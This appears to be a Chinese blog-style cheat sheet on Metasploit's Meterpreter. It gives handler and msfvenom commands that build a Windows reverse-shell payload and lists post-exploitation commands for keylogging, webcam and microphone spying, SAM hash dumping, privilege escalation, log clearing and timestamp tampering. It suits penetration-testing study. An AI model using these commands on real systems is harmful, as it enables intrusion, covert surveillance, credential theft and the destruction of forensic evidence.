ailx10说：这篇是2024年9月之前写的，后来又改过。Meterpreter 入门我先把控制端 handler 和目标程序配起来，让会话出现，再按文件、网络、系统、桌面和凭据整理常见命令。帮助选项很多，刚开始容易一口气全记下来，却忘了平台和权限会限制哪些真的可用。笔记更像自己的随手手册：遇到具体问题，再回相应分类找命令。getprivs 不会凭空造出新权力，hashdump 也不是所有域凭据都能拿到；知道手里这个会话到底是什么，比看见一个提示符就默认无所不能更有帮助。

---

（1）控制端：启动 Metasploit，配置 Listener

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <你的IP地址>
set LPORT <你要监听的端口>
exploit -j
```

（2）控制端：生成载荷，自己想办法投递载荷

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<你的IP地址> LPORT=<你要监听的端口> -f exe -o payload.exe
```

meter preter 核心命令：

- background / bg：将当前会话移到后台，以便可以继续使用 Metasploit 控制台执行其他操作
- bglist：列出当前正在后台运行的所有脚本
- bgkill：终止一个后台运行的 Meterpreter 脚本
- bgrun：将指定的 Meterpreter 脚本作为后台线程执行
- get\_timeouts：获取当前会话的超时设置
- set\_timeouts：设置当前会话的超时值
- sessions：快速切换到另一个会话

![](/notes-assets/a51b4ae62f187e0e9f2c.webp)

meter preter 文件相关操作：

- getlwd / lpwd：查看控制端的路径
- getwd pwd / pwd：查看被控端的路径
- lls / ldir：查看控制端目录下的文件
- ls / dir：查看被控端目录下的文件
- upload \[options\] src1 src2 src3 ... destination：上传文件
- download \[options\] src1 src2 src3 ... destination 下载文件

![](/notes-assets/09e7af71ad94bb2e6b84.webp)

meter preter 网络相关操作：

- ifconfig / ipconfig：显示目标系统的网络接口配置
- netstat：显示目标系统的当前网络连接情况
- getproxy：显示目标系统的当前代理服务器配置
- arp：显示目标主机的 ARP 缓存
- route：查看和修改目标主机的路由表

![](/notes-assets/39089c5b4b0e62ad0fab.webp)

meter preter 系统命令相关操作：

- sysinfo：获取目标系统的信息，如操作系统版本、主机名、架构等
- shell：进入目标系统的命令行 shell，允许执行系统命令
- clearev：清除目标主机的事件日志
- drop\_token：放弃当前会话使用的模拟令牌，恢复到原始用户的权限
- execute：在目标系统上执行一条命令
- getenv：获取目标系统中一个或多个环境变量的值
- getprivs：尝试启用当前进程可以访问的所有权限，通常用于提升权限
- getsid：获取当前会话运行的用户的安全标识符 (SID)，用于标识用户的权限和组信息
- getpid：获取当前会话所在的进程 ID，用于确定 Meterpreter 正在使用的进程
- getuid：获取当前会话运行的用户的用户名
- kill：终止目标主机上的一个进程
- ps：列出目标系统上所有正在运行的进程
- reg：修改和操作远程系统的注册表，可以用于持久化后门、修改系统配置等
- rev2self：恢复到原始用户身份，通常用于放弃权限提升

![](/notes-assets/3882e70655976b7f7376.webp)

meter preter 用户界面相关操作：

- keyscan\_start：开始捕获目标系统的键盘输入，记录用户的按键活动
- keyscan\_dump：转储键盘记录缓冲区中的内容，即获取已经捕获的键盘输入（按键记录）
- keyscan\_stop：停止捕获键盘输入，结束按键记录操作
- screenshare：实时观看目标用户的桌面，类似于远程桌面监控，能够看到用户当前的操作
- screenshot：捕获当前交互式桌面的屏幕截图，获取图像文件
- keyboard\_send：向目标系统发送一串按键（键盘输入），模拟用户的键盘操作
- keyevent：发送键盘事件（按键按下或释放），可以模拟单个按键的按压和释放动作
- mouse：发送鼠标事件，可以模拟鼠标的移动、点击、滚轮滚动等操作

![](/notes-assets/785595a9b026c722f34f.webp)

meter preter 摄像头相关操作：

- record\_mic：捕获目标环境的声音
- webcam\_chat：开启与目标系统的实时视频聊天功能
- webcam\_list：列出目标系统上可用的摄像头设备
- webcam\_snap：使用指定的摄像头拍摄一张快照
- webcam\_stream：实时观看目标摄像头的画面

![](/notes-assets/f1befbe6eedec3cc15a5.webp)

meter preter 音频输出相关操作：

- play：在目标系统上播放一个音频文件（`.wav` 格式）

![](/notes-assets/c1adb8efab9544fb7cda.webp)

meter preter 权限提升相关操作：

- getsystem：尝试将当前会话的权限提升为本地系统（`Local System`）级别

![](/notes-assets/9d5da2c5a69077fbcb43.webp)

meter preter 密码数据库相关操作：

- hashdump：导出目标系统的 SAM（Security Account Manager）数据库中的内容，SAM 数据库存储了本地用户账户的哈希值，这些哈希值可以用来破解密码或进行其他类型的攻击

![](/notes-assets/0be802b076757e3b4862.webp)

meter preter 时间戳相关操作：

- timestomp：操作文件的 MACE 属性（即文件的修改时间 `Modified`、访问时间 `Accessed`、创建时间 `Created` 和进入文件系统的时间 `Entry`）。通过修改这些时间戳，攻击者可以伪造文件的时间信息，以隐藏文件的实际创建或修改时间，从而躲避取证分析或混淆调查路径

![](/notes-assets/5f9f51c6345c1f231bd2.webp)

命令出现在帮助里，不代表当前平台和权限下都能执行。清日志、改时间也不是把经过抹掉的保证；理解输出背后的来源，比把菜单点完更重要。
